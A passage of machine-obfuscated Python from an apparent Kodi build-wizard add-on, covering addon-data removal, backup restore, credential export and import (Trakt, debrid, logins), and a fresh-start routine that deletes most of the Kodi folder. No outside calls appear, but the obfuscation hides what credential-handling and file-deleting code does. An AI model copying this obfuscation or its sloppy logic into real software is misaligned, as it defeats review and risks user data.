def removeAddonData (OOO0O0OO0OO0000OO ,name =None ,over =False ):#line:4626
	if OOO0O0OO0OO0000OO =='all':#line:4627
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4628
			wiz .cleanHouse (ADDOND )#line:4629
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4630
	elif OOO0O0OO0OO0000OO =='uninstalled':#line:4631
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4632
			O0OOO0O00O00OO0OO =0 #line:4633
			for OO0OOO0O0000OOOO0 in glob .glob (os .path .join (ADDOND ,'*')):#line:4634
				OOOOOOOOO00OO00O0 =OO0OOO0O0000OOOO0 .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4635
				if OOOOOOOOO00OO00O0 in EXCLUDES :pass #line:4636
				elif os .path .exists (os .path .join (ADDONS ,OOOOOOOOO00OO00O0 )):pass #line:4637
				else :wiz .cleanHouse (OO0OOO0O0000OOOO0 );O0OOO0O00O00OO0OO +=1 ;wiz .log (OO0OOO0O0000OOOO0 );shutil .rmtree (OO0OOO0O0000OOOO0 )#line:4638
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OOO0O00O00OO0OO ))#line:4639
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4640
	elif OOO0O0OO0OO0000OO =='empty':#line:4641
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4642
			O0OOO0O00O00OO0OO =wiz .emptyfolder (ADDOND )#line:4643
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,O0OOO0O00O00OO0OO ))#line:4644
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4645
	else :#line:4646
		OOOOOO00OO00000O0 =os .path .join (USERDATA ,'addon_data',OOO0O0OO0OO0000OO )#line:4647
		if OOO0O0OO0OO0000OO in EXCLUDES :#line:4648
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4649
		elif os .path .exists (OOOOOO00OO00000O0 ):#line:4650
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O0OO0OO0000OO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4651
				wiz .cleanHouse (OOOOOO00OO00000O0 )#line:4652
				try :#line:4653
					shutil .rmtree (OOOOOO00OO00000O0 )#line:4654
				except :#line:4655
					wiz .log ("Error deleting: %s"%OOOOOO00OO00000O0 )#line:4656
			else :#line:4657
				wiz .log ('Addon data for %s was not removed'%OOO0O0OO0OO0000OO )#line:4658
	wiz .refresh ()#line:4659
def restoreit (OO0O00000OOO00OO0 ):#line:4661
	if OO0O00000OOO00OO0 =='build':#line:4662
		O0OOO0O0OOO00000O =freshStart ('restore')#line:4663
		if O0OOO0O0OOO00000O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4664
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4665
		wiz .skinToDefault ()#line:4666
	wiz .restoreLocal (OO0O00000OOO00OO0 )#line:4667
def restoreextit (O0OOOO00OO0OOO0O0 ):#line:4669
	if O0OOOO00OO0OOO0O0 =='build':#line:4670
		O0O000000OO0OOO0O =freshStart ('restore')#line:4671
		if O0O000000OO0OOO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4672
	wiz .restoreExternal (O0OOOO00OO0OOO0O0 )#line:4673
def buildInfo (O0O0000OO0O0OO00O ):#line:4675
	if wiz .workingURL (SPEEDFILE )==True :#line:4676
		if wiz .checkBuild (O0O0000OO0O0OO00O ,'url'):#line:4677
			O0O0000OO0O0OO00O ,O00OOO0O00OOO0O0O ,O0O000O0OO0O0000O ,OO0000O0OOOO0OO00 ,OOOO00O00000OO0OO ,O0O00OOOOO000OOO0 ,O0000OOOOOO00000O ,OO000O0OO0O000OO0 ,OOO0O0O0OOOOOOO00 ,O0O00O0000O0O0OOO ,O0OO0OOOO00O0OO0O =wiz .checkBuild (O0O0000OO0O0OO00O ,'all')#line:4678
			O0O00O0000O0O0OOO ='Yes'if O0O00O0000O0O0OOO .lower ()=='yes'else 'No'#line:4679
			OOOO0OO00O00000O0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O0000OO0O0OO00O )#line:4680
			OOOO0OO00O00000O0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00OOO0O00OOO0O0O )#line:4681
			if not O0O00OOOOO000OOO0 =="http://":#line:4682
				O00OO0O00O00O0O0O =wiz .themeCount (O0O0000OO0O0OO00O ,False )#line:4683
				OOOO0OO00O00000O0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O00OO0O00O00O0O0O ))#line:4684
			OOOO0OO00O00000O0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO00O00000OO0OO )#line:4685
			OOOO0OO00O00000O0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0O00O0000O0O0OOO )#line:4686
			OOOO0OO00O00000O0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0OO0OOOO00O0OO0O )#line:4687
			wiz .TextBox (ADDONTITLE ,OOOO0OO00O00000O0 )#line:4688
		else :wiz .log ("Invalid Build Name!")#line:4689
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4690
def buildVideo (OOOO0OOO00OO0000O ):#line:4692
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4693
	if wiz .workingURL (SPEEDFILE )==True :#line:4694
		O0OO0OO0OOOOO0OOO =wiz .checkBuild (OOOO0OOO00OO0000O ,'preview')#line:4695
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%OOOO0OOO00OO0000O )#line:4696
		if O0OO0OO0OOOOO0OOO and not O0OO0OO0OOOOO0OOO =='http://':playVideo (O0OO0OO0OOOOO0OOO )#line:4697
		else :wiz .log ("[%s]Unable to find url for video preview"%OOOO0OOO00OO0000O )#line:4698
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4699
def dependsList (O0OO00O000O000O0O ):#line:4701
	OO00O0O00O0O0O0OO =os .path .join (ADDONS ,O0OO00O000O000O0O ,'addon.xml')#line:4702
	if os .path .exists (OO00O0O00O0O0O0OO ):#line:4703
		O00O0OOOO00O0000O =open (OO00O0O00O0O0O0OO ,mode ='r');OOOOOO000OOO000O0 =O00O0OOOO00O0000O .read ();O00O0OOOO00O0000O .close ();#line:4704
		O0000O0OO0OO000OO =wiz .parseDOM (OOOOOO000OOO000O0 ,'import',ret ='addon')#line:4705
		OOO00OO0OO0000O0O =[]#line:4706
		for OOOO0OOO000OO00OO in O0000O0OO0OO000OO :#line:4707
			if not 'xbmc.python'in OOOO0OOO000OO00OO :#line:4708
				OOO00OO0OO0000O0O .append (OOOO0OOO000OO00OO )#line:4709
		return OOO00OO0OO0000O0O #line:4710
	return []#line:4711
def manageSaveData (O00OO0O0O00000O00 ):#line:4713
	if O00OO0O0O00000O00 =='import':#line:4714
		O0O00000000000O0O =os .path .join (ADDONDATA ,'temp')#line:4715
		if not os .path .exists (O0O00000000000O0O ):os .makedirs (O0O00000000000O0O )#line:4716
		OO000OO0OOO00O000 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4717
		if not OO000OO0OOO00O000 .endswith ('.zip'):#line:4718
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4719
			return #line:4720
		OO0000OOO000O0O00 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4721
		O0000OOO000O0O0O0 =xbmcvfs .copy (OO000OO0OOO00O000 ,OO0000OOO000O0O00 )#line:4722
		wiz .log ("%s"%str (O0000OOO000O0O0O0 ))#line:4723
		extract .all (xbmc .translatePath (OO0000OOO000O0O00 ),O0O00000000000O0O )#line:4724
		O000OOOOO0000OO0O =os .path .join (O0O00000000000O0O ,'trakt')#line:4725
		OO0O000O00O00000O =os .path .join (O0O00000000000O0O ,'login')#line:4726
		OO0000O0OOOO000O0 =os .path .join (O0O00000000000O0O ,'debrid')#line:4727
		O00000O0O0000OO0O =0 #line:4728
		if os .path .exists (O000OOOOO0000OO0O ):#line:4729
			O00000O0O0000OO0O +=1 #line:4730
			OO0O0OO0OOO000OO0 =os .listdir (O000OOOOO0000OO0O )#line:4731
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4732
			for O000000O00O0OO0O0 in OO0O0OO0OOO000OO0 :#line:4733
				O00O0O00O00000000 =os .path .join (traktit .TRAKTFOLD ,O000000O00O0OO0O0 )#line:4734
				O0OO00OOOOOO0OO00 =os .path .join (O000OOOOO0000OO0O ,O000000O00O0OO0O0 )#line:4735
				if os .path .exists (O00O0O00O00000000 ):#line:4736
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000000O00O0OO0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4737
					else :os .remove (O00O0O00O00000000 )#line:4738
				shutil .copy (O0OO00OOOOOO0OO00 ,O00O0O00O00000000 )#line:4739
			traktit .importlist ('all')#line:4740
			traktit .traktIt ('restore','all')#line:4741
		if os .path .exists (OO0O000O00O00000O ):#line:4742
			O00000O0O0000OO0O +=1 #line:4743
			OO0O0OO0OOO000OO0 =os .listdir (OO0O000O00O00000O )#line:4744
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4745
			for O000000O00O0OO0O0 in OO0O0OO0OOO000OO0 :#line:4746
				O00O0O00O00000000 =os .path .join (loginit .LOGINFOLD ,O000000O00O0OO0O0 )#line:4747
				O0OO00OOOOOO0OO00 =os .path .join (OO0O000O00O00000O ,O000000O00O0OO0O0 )#line:4748
				if os .path .exists (O00O0O00O00000000 ):#line:4749
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000000O00O0OO0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4750
					else :os .remove (O00O0O00O00000000 )#line:4751
				shutil .copy (O0OO00OOOOOO0OO00 ,O00O0O00O00000000 )#line:4752
			loginit .importlist ('all')#line:4753
			loginit .loginIt ('restore','all')#line:4754
		if os .path .exists (OO0000O0OOOO000O0 ):#line:4755
			O00000O0O0000OO0O +=1 #line:4756
			OO0O0OO0OOO000OO0 =os .listdir (OO0000O0OOOO000O0 )#line:4757
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4758
			for O000000O00O0OO0O0 in OO0O0OO0OOO000OO0 :#line:4759
				O00O0O00O00000000 =os .path .join (debridit .REALFOLD ,O000000O00O0OO0O0 )#line:4760
				O0OO00OOOOOO0OO00 =os .path .join (OO0000O0OOOO000O0 ,O000000O00O0OO0O0 )#line:4761
				if os .path .exists (O00O0O00O00000000 ):#line:4762
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,O000000O00O0OO0O0 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4763
					else :os .remove (O00O0O00O00000000 )#line:4764
				shutil .copy (O0OO00OOOOOO0OO00 ,O00O0O00O00000000 )#line:4765
			debridit .importlist ('all')#line:4766
			debridit .debridIt ('restore','all')#line:4767
		wiz .cleanHouse (O0O00000000000O0O )#line:4768
		wiz .removeFolder (O0O00000000000O0O )#line:4769
		os .remove (OO0000OOO000O0O00 )#line:4770
		if O00000O0O0000OO0O ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4771
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4772
	elif O00OO0O0O00000O00 =='export':#line:4773
		OO000000OO00OO00O =xbmc .translatePath (MYBUILDS )#line:4774
		O000OO0O000O0O0OO =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4775
		traktit .traktIt ('update','all')#line:4776
		loginit .loginIt ('update','all')#line:4777
		debridit .debridIt ('update','all')#line:4778
		OO000OO0OOO00O000 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4779
		OO000OO0OOO00O000 =xbmc .translatePath (OO000OO0OOO00O000 )#line:4780
		OOO0OO00OOOOOOO00 =os .path .join (OO000000OO00OO00O ,'SaveData.zip')#line:4781
		OO000OOOOO0O0O00O =zipfile .ZipFile (OOO0OO00OOOOOOO00 ,mode ='w')#line:4782
		for OO0OO00OOOOO000O0 in O000OO0O000O0O0OO :#line:4783
			if os .path .exists (OO0OO00OOOOO000O0 ):#line:4784
				OO0O0OO0OOO000OO0 =os .listdir (OO0OO00OOOOO000O0 )#line:4785
				for OOO000OOOOOO00OOO in OO0O0OO0OOO000OO0 :#line:4786
					OO000OOOOO0O0O00O .write (os .path .join (OO0OO00OOOOO000O0 ,OOO000OOOOOO00OOO ),os .path .join (OO0OO00OOOOO000O0 ,OOO000OOOOOO00OOO ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4787
		OO000OOOOO0O0O00O .close ()#line:4788
		if OO000OO0OOO00O000 ==OO000000OO00OO00O :#line:4789
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00OOOOOOO00 ))#line:4790
		else :#line:4791
			try :#line:4792
				xbmcvfs .copy (OOO0OO00OOOOOOO00 ,os .path .join (OO000OO0OOO00O000 ,'SaveData.zip'))#line:4793
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (OO000OO0OOO00O000 ,'SaveData.zip')))#line:4794
			except :#line:4795
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OOO0OO00OOOOOOO00 ))#line:4796
def freshStart (install =None ,over =False ):#line:4801
	if USERNAME =='':#line:4802
		ADDON .openSettings ()#line:4803
		sys .exit ()#line:4804
	OO00OOO00O0000O0O =(SPEEDFILE )#line:4805
	(OO00OOO00O0000O0O )#line:4806
	O0OOOO00OOO0OO00O =(wiz .workingURL (OO00OOO00O0000O0O ))#line:4807
	(O0OOOO00OOO0OO00O )#line:4808
	if KEEPTRAKT =='true':#line:4809
		traktit .autoUpdate ('all')#line:4810
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4811
	if KEEPREAL =='true':#line:4812
		debridit .autoUpdate ('all')#line:4813
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4814
	if KEEPLOGIN =='true':#line:4815
		loginit .autoUpdate ('all')#line:4816
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4817
	if over ==True :OOO0OOO0OO0O00000 =1 #line:4818
	elif install =='restore':OOO0OOO0OO0O00000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4819
	elif install :OOO0OOO0OO0O00000 =1 #line:4820
	else :OOO0OOO0OO0O00000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4821
	if OOO0OOO0OO0O00000 :#line:4822
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4823
			O0O00OO00OOO00000 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4824
			skinSwitch .swapSkins (O0O00OO00OOO00000 )#line:4827
			OOO0OOO0O00O0O0O0 =0 #line:4828
			xbmc .sleep (1000 )#line:4829
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOO0OOO0O00O0O0O0 <150 :#line:4830
				OOO0OOO0O00O0O0O0 +=1 #line:4831
				xbmc .sleep (1000 )#line:4832
				wiz .ebi ('SendAction(Select)')#line:4833
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4834
				wiz .ebi ('SendClick(11)')#line:4835
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4836
			xbmc .sleep (1000 )#line:4837
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4838
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4839
			return #line:4840
		wiz .addonUpdates ('set')#line:4841
		OO0O00O0OOOO0O0OO =os .path .abspath (HOME )#line:4842
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4843
		O0O00O0000O00OOO0 =sum ([len (O0O0O0OO0OO00O000 )for OO0O00OO00OOOO0O0 ,OO0OO0O0OO0O0000O ,O0O0O0OO0OO00O000 in os .walk (OO0O00O0OOOO0O0OO )]);O0OOO00OO0O0O0OO0 =0 #line:4844
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4845
		EXCLUDES .append ('My_Builds')#line:4846
		EXCLUDES .append ('archive_cache')#line:4847
		EXCLUDES .append ('script.module.requests')#line:4848
		EXCLUDES .append ('myfav.anon')#line:4849
		if KEEPREPOS =='true':#line:4850
			OO0O0OOOO0O0O000O =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4851
			for OO0O00O000O0O0O00 in OO0O0OOOO0O0O000O :#line:4852
				O0OOO0OO00O0OOOO0 =os .path .split (OO0O00O000O0O0O00 [:-1 ])[1 ]#line:4853
				if not O0OOO0OO00O0OOOO0 ==EXCLUDES :#line:4854
					EXCLUDES .append (O0OOO0OO00O0OOOO0 )#line:4855
		if KEEPSUPER =='true':#line:4856
			EXCLUDES .append ('plugin.program.super.favourites')#line:4857
		if KEEPMOVIELIST =='true':#line:4858
			EXCLUDES .append ('plugin.video.metalliq')#line:4859
		if KEEPMOVIELIST =='true':#line:4860
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4861
		if KEEPADDONS =='true':#line:4862
			EXCLUDES .append ('addons')#line:4863
		if KEEPTELEMEDIA =='true':#line:4864
			EXCLUDES .append ('plugin.video.telemedia')#line:4865
		EXCLUDES .append ('plugin.video.elementum')#line:4870
		EXCLUDES .append ('script.elementum.burst')#line:4871
		EXCLUDES .append ('script.elementum.burst-master')#line:4872
		EXCLUDES .append ('plugin.video.quasar')#line:4873
		EXCLUDES .append ('script.quasar.burst')#line:4874
		EXCLUDES .append ('skin.estuary')#line:4875
		if KEEPWHITELIST =='true':#line:4878
			OOOOOOOOOO0OOO00O =''#line:4879
			O0000OO00OO0OOO00 =wiz .whiteList ('read')#line:4880
			if len (O0000OO00OO0OOO00 )>0 :#line:4881
				for OO0O00O000O0O0O00 in O0000OO00OO0OOO00 :#line:4882
					try :O00OO0OOO0OOO000O ,OOO000O00O0O0OOO0 ,OOOO000O000O000OO =OO0O00O000O0O0O00 #line:4883
					except :pass #line:4884
					if OOOO000O000O000OO .startswith ('pvr'):OOOOOOOOOO0OOO00O =OOO000O00O0O0OOO0 #line:4885
					O00OOO0O00O0OOOO0 =dependsList (OOOO000O000O000OO )#line:4886
					for O00OOOOO00O00OOOO in O00OOO0O00O0OOOO0 :#line:4887
						if not O00OOOOO00O00OOOO in EXCLUDES :#line:4888
							EXCLUDES .append (O00OOOOO00O00OOOO )#line:4889
						OO0OOOOOOOOOO0OOO =dependsList (O00OOOOO00O00OOOO )#line:4890
						for O000OOO0OO00O000O in OO0OOOOOOOOOO0OOO :#line:4891
							if not O000OOO0OO00O000O in EXCLUDES :#line:4892
								EXCLUDES .append (O000OOO0OO00O000O )#line:4893
					if not OOOO000O000O000OO in EXCLUDES :#line:4894
						EXCLUDES .append (OOOO000O000O000OO )#line:4895
				if not OOOOOOOOOO0OOO00O =='':wiz .setS ('pvrclient',OOOO000O000O000OO )#line:4896
		if wiz .getS ('pvrclient')=='':#line:4897
			for OO0O00O000O0O0O00 in EXCLUDES :#line:4898
				if OO0O00O000O0O0O00 .startswith ('pvr'):#line:4899
					wiz .setS ('pvrclient',OO0O00O000O0O0O00 )#line:4900
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4901
		O000OO00OO00O00O0 =wiz .latestDB ('Addons')#line:4902
		for O00OO0000000O0O0O ,O0OOOO00O0OO00OO0 ,O000O0O0OO0000O0O in os .walk (OO0O00O0OOOO0O0OO ,topdown =True ):#line:4903
			O0OOOO00O0OO00OO0 [:]=[OOO0OOOOO000O0OO0 for OOO0OOOOO000O0OO0 in O0OOOO00O0OO00OO0 if OOO0OOOOO000O0OO0 not in EXCLUDES ]#line:4904
			for O00OO0OOO0OOO000O in O000O0O0OO0000O0O :#line:4905
				O0OOO00OO0O0O0OO0 +=1 #line:4906
				OOOO000O000O000OO =O00OO0000000O0O0O .replace ('/','\\').split ('\\')#line:4907
				OOO0OOO0O00O0O0O0 =len (OOOO000O000O000OO )-1 #line:4909
				if OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4910
				elif O00OO0OOO0OOO000O =='MyVideos99.db'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4911
				elif O00OO0OOO0OOO000O =='MyVideos107.db'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4912
				elif O00OO0OOO0OOO000O =='MyVideos116.db'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4913
				elif O00OO0OOO0OOO000O =='MyVideos99.db'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4914
				elif O00OO0OOO0OOO000O =='MyVideos107.db'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4915
				elif O00OO0OOO0OOO000O =='MyVideos116.db'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4916
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4917
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'skin.anonymous.mod'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4918
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'skin.Premium.mod'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4919
				elif OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -2 ]=='userdata'and OOOO000O000O000OO [OOO0OOO0O00O0O0O0 -1 ]=='addon_data'and 'skin.anonymous.nox'in OOOO000O000O000OO [OOO0OOO0O00O0O0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O00OO0000000O0O0O ,O00OO0OOO0OOO000O ),xbmc .LOGNOTICE )#line:4920
